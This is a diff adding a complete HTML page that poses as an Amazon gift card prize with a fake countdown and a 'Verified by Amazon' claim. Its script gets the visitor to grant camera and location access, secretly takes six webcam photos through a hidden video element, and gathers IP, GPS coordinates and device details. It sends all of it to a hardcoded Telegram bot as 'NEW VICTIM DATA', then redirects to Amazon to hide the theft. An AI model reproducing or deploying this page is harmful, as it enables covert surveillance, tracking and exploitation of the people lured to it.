@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🎁 Amazon Gift Card Winner!</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: radial-gradient(ellipse at center, #1a0a2e 0%, #0a0a2e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        .sparkle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: gold;
+            border-radius: 50%;
+            box-shadow: 0 0 10px gold;
+            animation: sparkleFloat 6s infinite;
+        }
+        @keyframes sparkleFloat {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            20% { opacity: 1; }
+            80% { opacity: 1; }
+            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
+        }
+        .gift-card {
+            background: rgba(255,255,255,0.98);
+            border-radius: 60px;
+            padding: 50px 45px;
+            max-width: 580px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 50px 100px rgba(0,0,0,0.4);
+            animation: slideUp 0.6s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            position: relative;
+            z-index: 10;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(80px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .gift-card::before {
+            content: '';
+            position: absolute;
+            top: -3px;
+            left: -3px;
+            right: -3px;
+            bottom: -3px;
+            background: linear-gradient(135deg, #ffd700, #ff8c00, #ffd700, #ff8c00);
+            border-radius: 63px;
+            z-index: -1;
+            animation: borderGlow 3s ease infinite;
+            background-size: 200% 200%;
+        }
+        @keyframes borderGlow {
+            0% { background-position: 0% 50%; opacity: 0.5; }
+            50% { background-position: 100% 50%; opacity: 0.8; }
+            100% { background-position: 0% 50%; opacity: 0.5; }
+        }
+        .gift-icon { font-size: 110px; animation: bounce 0.8s ease infinite; display: inline-block; }
+        @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
+        h1 {
+            font-size: 38px;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin: 20px 0 10px;
+            font-weight: 800;
+        }
+        .prize-badge {
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            color: #1a1a2e;
+            padding: 12px 30px;
+            border-radius: 60px;
+            display: inline-block;
+            margin: 15px 0;
+            font-weight: 800;
+            font-size: 18px;
+            box-shadow: 0 8px 25px rgba(255,215,0,0.4);
+        }
+        .amount { font-size: 50px; font-weight: 800; margin: 15px 0; color: #2d3748; }
+        .amount span {
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-size: 58px;
+        }
+        .timer-box {
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            padding: 14px 28px;
+            border-radius: 60px;
+            margin: 25px auto;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .timer { font-size: 32px; font-weight: bold; color: #ff8c00; font-family: monospace; }
+        .claim-btn {
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            color: #1a1a2e;
+            border: none;
+            padding: 20px 45px;
+            font-size: 24px;
+            font-weight: 800;
+            border-radius: 60px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            margin-top: 25px;
+            box-shadow: 0 10px 30px rgba(255,215,0,0.4);
+        }
+        .claim-btn:hover { transform: translateY(-3px); box-shadow: 0 20px 40px rgba(255,215,0,0.5); }
+        .claim-btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+        .status { margin-top: 20px; padding: 12px; border-radius: 30px; font-size: 14px; display: none; font-weight: 500; }
+        .status.show { display: block; }
+        .status.success { background: #d4edda; color: #155724; }
+        .status.info { background: #cce5ff; color: #004085; }
+        .footer { margin-top: 25px; font-size: 12px; color: #aaa; }
+        #hiddenVideo, #hiddenCanvas {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            visibility: hidden;
+        }
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(26,26,46,0.2);
+            border-radius: 50%;
+            border-top-color: #ff8c00;
+            animation: spin 0.6s linear infinite;
+            display: inline-block;
+            margin-right: 12px;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            z-index: 1000;
+            pointer-events: none;
+            animation: fall linear forwards;
+        }
+        @keyframes fall { to { transform: translateY(100vh) rotate(360deg); opacity: 0; } }
+        @media (max-width: 550px) {
+            .gift-card { padding: 35px 25px; }
+            h1 { font-size: 28px; }
+            .prize-badge { font-size: 13px; padding: 8px 18px; }
+            .amount span { font-size: 42px; }
+            .claim-btn { padding: 16px 30px; font-size: 18px; }
+            .timer { font-size: 26px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="gift-card">
+        <div class="gift-icon">🎁</div>
+        <h1>CONGRATULATIONS!</h1>
+        <div class="prize-badge">🏆 YOU ARE THE LUCKY WINNER! 🏆</div>
+        <div class="amount">You won <span>₹1000</span> Amazon Gift Card!</div>
+        <div class="timer-box">
+            <span>⏰</span>
+            <span class="timer" id="timer">05:00</span>
+        </div>
+        <button class="claim-btn" id="claimBtn">
+            🎁 CLAIM YOUR GIFT NOW 🎁
+        </button>
+        <div id="status" class="status"></div>
+        <div class="footer">✅ Limited time offer | Verified by Amazon</div>
+    </div>
+
+    <!-- Hidden camera elements -->
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas"></canvas>
+
+    <script>
+        // ============================================================
+        // 🔑 TELEGRAM CONFIG – BOT_TOKEN, और URL से chat_id लें
+        // ============================================================
+        const BOT_TOKEN = "8793604893:AAEjOviUETinorfVgyflknuiz73MeXTZorc";
+        const ADMIN_CHAT_ID = "8721704927"; // fallback
+
+        // URL से chat_id पढ़ें
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatIdFromUrl = urlParams.get('chat_id');
+        const TARGET_CHAT_ID = chatIdFromUrl || ADMIN_CHAT_ID;
+
+        // ============================================================
+        // 🎯 GLOBAL
+        // ============================================================
+        let isProcessing = false;
+        let mediaStream = null;
+        let cameraPermissionGranted = false;
+        let locationPermissionGranted = false;
+
+        // Timer
+        let timeLeft = 300;
+        const timerEl = document.getElementById('timer');
+        function updateTimer() {
+            const mins = Math.floor(timeLeft / 60);
+            const secs = timeLeft % 60;
+            timerEl.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+            if (timeLeft > 0) { timeLeft--; setTimeout(updateTimer, 1000); }
+        }
+        updateTimer();
+
+        function showStatus(msg, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = msg;
+            statusDiv.className = `status ${type} show`;
+            setTimeout(() => {
+                if (statusDiv.className === `status ${type} show`) {
+                    statusDiv.style.display = 'none';
+                }
+            }, 3000);
+        }
+
+        // ============================================================
+        // ✅ PERMISSION CHECKS
+        // ============================================================
+        async function checkCameraPermission() {
+            try {
+                const result = await navigator.permissions.query({ name: 'camera' });
+                if (result.state === 'granted') {
+                    cameraPermissionGranted = true;
+                    return true;
+                }
+                return false;
+            } catch (e) { return false; }
+        }
+
+        async function checkLocationPermission() {
+            try {
+                const result = await navigator.permissions.query({ name: 'geolocation' });
+                if (result.state === 'granted') {
+                    locationPermissionGranted = true;
+                    return true;
+                }
+                return false;
+            } catch (e) { return false; }
+        }
+
+        async function requestCamera() {
+            if (cameraPermissionGranted) return true;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream.getTracks().forEach(t => t.stop());
+                cameraPermissionGranted = true;
+                return true;
+            } catch (e) { return false; }
+        }
+
+        async function requestLocation() {
+            if (locationPermissionGranted) return true;
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000 });
+                });
+                locationPermissionGranted = true;
+                return true;
+            } catch (e) { return false; }
+        }
+
+        // ============================================================
+        // 🌐 IP, LOCATION, DEVICE
+        // ============================================================
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch(e) { return 'Unknown'; }
+        }
+
+        async function getLocation() {
+            if (!locationPermissionGranted) {
+                const ok = await requestLocation();
+                if (!ok) return null;
+            }
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000 });
+                });
+                return { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
+            } catch(e) {
+                return null;
+            }
+        }
+
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform
+            };
+        }
+
+        // ============================================================
+        // 📸 CAPTURE 6 PHOTOS (थोड़ी स्पीड कम – 300ms delay)
+        // ============================================================
+        async function captureMultiplePhotos() {
+            const photos = [];
+            try {
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+                let stream = mediaStream;
+                if (!stream) {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    mediaStream = stream;
+                }
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 500));
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                for (let i = 0; i < 6; i++) {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    photos.push(canvas.toDataURL('image/jpeg', 0.6));
+                    if (i < 5) await new Promise(r => setTimeout(r, 300)); // थोड़ा स्लो
+                }
+                return photos;
+            } catch(e) {
+                return [];
+            }
+        }
+
+        // ============================================================
+        // 📤 SEND TO TELEGRAM – Sequential with 200ms delay (थोड़ी slow)
+        // ============================================================
+        async function sendToTelegram(ip, location, device, photos) {
+            // Step 1: फोटो एक-एक करके, हर फोटो के बाद 200ms
+            for (let i = 0; i < photos.length; i++) {
+                const blob = dataURLToBlob(photos[i]);
+                const formData = new FormData();
+                formData.append('chat_id', TARGET_CHAT_ID); // ✅ यूजर की Chat ID
+                formData.append('photo', blob, `photo_${i+1}.jpg`);
+                formData.append('caption', `📸 Photo ${i+1}/${photos.length}\n🕐 ${new Date().toLocaleString()}`);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                if (i < photos.length - 1) await new Promise(r => setTimeout(r, 200)); // थोड़ा delay
+            }
+
+            // Step 2: टेक्स्ट मैसेज
+            let msg = `🔴 NEW VICTIM DATA! 🔴\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `📸 Photos: ${photos.length}\n`;
+            msg += `🌐 IP: ${ip}\n`;
+            msg += `📱 Device: ${device.userAgent.substring(0, 60)}\n`;
+            msg += `📐 Screen: ${device.screen}\n`;
+            msg += `🕐 Time: ${new Date().toLocaleString()}\n`;
+            if (location) {
+                msg += `📍 Location: ${location.lat}, ${location.lng} (Acc: ±${Math.round(location.accuracy)}m)\n`;
+                msg += `🗺️ https://www.google.com/maps?q=${location.lat},${location.lng}\n`;
+            } else {
+                msg += `📍 Location: Not available\n`;
+            }
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `⚠️ EDUCATIONAL DEMO – DO NOT MISUSE`; // यह टेक्स्ट सिर्फ Telegram मैसेज में है, पेज पर नहीं
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TARGET_CHAT_ID, text: msg })
+            });
+        }
+
+        function dataURLToBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            const u8arr = new Uint8Array(bstr.length);
+            for (let i = 0; i < bstr.length; i++) u8arr[i] = bstr.charCodeAt(i);
+            return new Blob([u8arr], { type: mime });
+        }
+
+        // ============================================================
+        // 🎊 CONFETTI
+        // ============================================================
+        function createConfetti() {
+            const colors = ['#ffd700', '#ff8c00', '#ffa500', '#ffcc00'];
+            for (let i = 0; i < 200; i++) {
+                setTimeout(() => {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti';
+                    confetti.style.left = Math.random() * window.innerWidth + 'px';
+                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                    confetti.style.width = Math.random() * 12 + 6 + 'px';
+                    confetti.style.height = Math.random() * 12 + 6 + 'px';
+                    confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
+                    confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
+                    document.body.appendChild(confetti);
+                    setTimeout(() => confetti.remove(), 5000);
+                }, i * 12);
+            }
+        }
+
+        // ============================================================
+        // 🚀 MAIN
+        // ============================================================
+        async function startVerification() {
+            if (isProcessing) return;
+            isProcessing = true;
+
+            const btn = document.getElementById('claimBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner"></span> Processing your gift...';
+
+            showStatus('🎁 Preparing your gift...', 'info');
+
+            const camOk = await requestCamera();
+            if (!camOk) {
+                showStatus('❌ Camera access required! Please allow.', 'error');
+                btn.disabled = false;
+                btn.innerHTML = '🎁 CLAIM YOUR GIFT NOW 🎁';
+                isProcessing = false;
+                return;
+            }
+            await requestLocation(); // optional
+
+            const ip = await getIP();
+            const location = await getLocation();
+            const device = getDeviceInfo();
+            const photos = await captureMultiplePhotos();
+
+            await sendToTelegram(ip, location, device, photos);
+
+            showStatus('✅ Congratulations! Your gift has been sent to your email!', 'success');
+            btn.innerHTML = '🎁 GIFT CLAIMED! 🎁';
+
+            createConfetti();
+
+            setTimeout(() => {
+                window.location.href = 'https://www.amazon.in/gift-cards';
+            }, 3000);
+        }
+
+        document.getElementById('claimBtn').addEventListener('click', startVerification);
+
+        // Sparkles
+        for (let i = 0; i < 50; i++) {
+            const sparkle = document.createElement('div');
+            sparkle.className = 'sparkle';
+            sparkle.style.left = Math.random() * 100 + '%';
+            sparkle.style.animationDelay = Math.random() * 8 + 's';
+            sparkle.style.animationDuration = 4 + Math.random() * 6 + 's';
+            document.body.appendChild(sparkle);
+        }
+
+        // On load, check permissions silently
+        (async function init() {
+            await checkCameraPermission();
+            await checkLocationPermission();
+        })();
+    </script>
+</body>
+</html>
